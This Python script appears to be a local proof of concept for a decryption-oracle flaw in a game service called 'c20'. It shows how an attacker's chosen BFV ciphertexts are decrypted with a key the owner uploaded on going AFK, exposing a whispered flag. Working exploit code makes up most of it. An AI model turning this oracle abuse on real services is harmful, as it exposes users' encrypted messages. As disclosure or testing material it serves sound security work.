"""Local reproduction of the c20 AFK decryption oracle.

Runs inside the app container (needs sealy + backend.zkp_lib). Talks to the
service over HTTP only, exactly like a real client would.
"""
import base64
import os
import random
import sys
from hashlib import sha256
from random import Random

import requests
from sealy import (
    BFVEncoder,
    BfvEncryptionParametersBuilder,
    Ciphertext,
    CoefficientModulus,
    Context,
    Decryptor,
    DegreeType,
    Encryptor,
    KeyGenerator,
    PlainModulus,
    Plaintext,
    PublicKey,
    SecurityLevel,
)

from backend import zkp_lib

BASE = os.environ.get("C20_BASE", "http://localhost:9200/c20")
N = 2048
T = 61441  # PlainModulus.batching(2048, 16)

degree = DegreeType(N)
sec = SecurityLevel(128)
params = (
    BfvEncryptionParametersBuilder()
    .with_poly_modulus_degree(degree)
    .with_coefficient_modulus(CoefficientModulus.bfv(degree, sec))
    .with_plain_modulus(PlainModulus.batching(degree, 16))
    .build()
)
ctx = Context(params, False, sec)
encoder = BFVEncoder(ctx)


def b64(b):
    return base64.b64encode(b).decode()


def unb64(s):
    return base64.b64decode(s)


class Client:
    def __init__(self, name):
        self.name = name
        self.token = None
        kg = KeyGenerator(ctx)
        self.sk = kg.secret_key()
        self.pk = kg.create_public_key()
        self.pk_bytes = bytes(self.pk.as_bytes())
        self.sk_bytes = bytes(self.sk.as_bytes())
        self.uid = None

    def req(self, method, path, **kw):
        headers = kw.pop("headers", {})
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        r = requests.request(method, BASE + path, headers=headers, **kw)
        if "X-C20-Token" in r.headers:
            self.token = r.headers["X-C20-Token"]
        return r

    def register(self):
        r = self.req("POST", "/register", data=self.pk_bytes)
        r.raise_for_status()
        self.uid = r.json()["uid"]
        print(f"[{self.name}] registered uid={self.uid}")

    def login(self):
        proof = zkp_lib.prove(self.pk_bytes, self.sk_bytes)
        self.token = None
        r = self.req("POST", f"/login?uid={self.uid}", data=proof)
        r.raise_for_status()
        print(f"[{self.name}] login via ZK proof ({len(proof)} B) -> {r.json()['message']}")

    def encrypt_to(self, pk_bytes, values):
        pk = PublicKey.from_bytes(ctx, pk_bytes)
        pt = encoder.encode_int(list(values))
        return bytes(Encryptor(ctx, pk).encrypt(pt).as_bytes())

    def decrypt(self, ct_bytes):
        ct = Ciphertext.from_bytes(ctx, ct_bytes)
        pt = Decryptor(ctx, self.sk).decrypt(ct)
        return [int(x) for x in encoder.decode_int(pt)]


def text_values(s):
    v = list(s.encode())
    return v + [0] * (N - len(v))


def values_text(v):
    out = bytearray()
    for x in v:
        if x == 0:
            break
        out.append(x)
    return out.decode(errors="replace")


def decode_broadcast_values(content):
    # "roll <id> from <uid>: <base64 plaintext>"
    blob = unb64(content.rsplit(" ", 1)[1])
    pt = Plaintext.from_bytes(ctx, blob)
    return [int(x) for x in encoder.decode_int(pt)]


def p1_values(c0, c2):
    seed = sha256(sha256(c0).digest() + sha256(c2).digest()).digest()
    rng = Random(seed)
    return [rng.randint(1, 20) for _ in range(N)]


def main():
    game = "oracle-demo-" + "".join(random.choice("abcdef0123456789") for _ in range(6))

    owner, friend, attacker = Client("owner"), Client("friend"), Client("attacker")
    for c in (owner, friend, attacker):
        c.register()
    owner.login()

    # Owner creates a game. roll_ciphertext m2 is random dice values under the owner key.
    m2 = [random.randint(1, 20) for _ in range(N)]
    c2 = owner.encrypt_to(owner.pk_bytes, m2)
    r = owner.req("POST", "/games", json={"name": game, "description": "demo", "ciphertext": b64(c2)})
    r.raise_for_status()
    print(f"[owner] created game {game}")

    for c in (friend, attacker):
        c.req("POST", f"/games/{game}/join").raise_for_status()
    print("[friend] [attacker] joined the game (join is open to anyone)")

    # Friend whispers a secret to the owner, encrypted end-to-end to the owner's public key.
    secret = "FLAG{whispered_to_the_owner}"
    w = friend.encrypt_to(owner.pk_bytes, text_values(secret))
    friend.req("POST", f"/games/{game}/whisper?recipient_uid={owner.uid}", data=w).raise_for_status()
    r = attacker.req("GET", f"/games/{game}/whispers")
    print(f"[attacker] /whispers as attacker -> {r.json()} (cannot read the whisper, as designed)")

    # Attacker queues a roll BEFORE the owner goes AFK: a ciphertext of attacker-chosen values.
    v_pre = [random.randint(1, 20) for _ in range(N)]
    c0_pre = attacker.encrypt_to(owner.pk_bytes, v_pre)
    r = attacker.req("POST", f"/games/{game}/roll", data=c0_pre)
    r.raise_for_status()
    pre_id = r.json()["id"]
    print(f"[attacker] roll #{pre_id} queued while owner is NOT afk -> resolved_immediately={r.json()['resolved_immediately']}")

    # Owner enables AFK: the secret key is POSTed to the server verbatim.
    r = owner.req("POST", f"/games/{game}/afk?enabled=1", data=owner.sk_bytes)
    r.raise_for_status()
    afk = r.json()
    print(f"[owner] /afk?enabled=1 with {len(owner.sk_bytes)} B secret key -> owner_afk={afk['owner_afk']}, resolved={afk['resolved']}")

    # Attacker sends another chosen ciphertext while AFK is on.
    v = [random.randint(1, 20) for _ in range(N)]
    c0 = attacker.encrypt_to(owner.pk_bytes, v)
    r = attacker.req("POST", f"/games/{game}/roll", data=c0)
    r.raise_for_status()
    out = r.json()
    print(f"[attacker] roll #{out['id']} while owner afk -> resolved_immediately={out['resolved_immediately']}")
    content = out["result_message"]["content"]
    print(f"[attacker] server broadcast: {content[:60]}...")

    # Verify: what came back is Dec_owner(c0) * p1 * m2 (slot-wise).
    got = decode_broadcast_values(content)
    p1 = p1_values(c0, c2)
    expected = [(a * b * c) % T for a, b, c in zip(v, p1, m2)]
    ok = got == expected
    print(f"[check] broadcast == Dec_owner(c0) * p1 * m2 for all {N} slots: {ok}")
    print(f"[check] first slots: chosen={v[:5]} p1={p1[:5]} m2={m2[:5]} broadcast={got[:5]}")

    # Verify the earlier pre-queued request was resolved the moment AFK was enabled.
    pre_resolved = any(x["request_id"] == pre_id for x in afk["resolved"])
    print(f"[check] pre-queued roll #{pre_id} auto-decrypted on /afk enable: {pre_resolved}")

    # Verify every member (not only the attacker) sees the decrypted result in history.
    hist = friend.req("GET", f"/games/{game}").json()["history"]
    seen = [m for m in hist if m["content"] == content]
    print(f"[check] friend (plain member) sees the decrypted plaintext in game history: {bool(seen)}")

    # Verify the stored key really is the identity key: it decrypts the whisper.
    wl = owner.req("GET", f"/games/{game}/whispers").json()
    plain = values_text(owner.decrypt(unb64(wl[0]["content"])))
    print(f"[check] the key the server now stores decrypts whispers to the owner: {plain!r}")

    return 0 if (ok and pre_resolved and seen) else 1


if __name__ == "__main__":
    sys.exit(main())
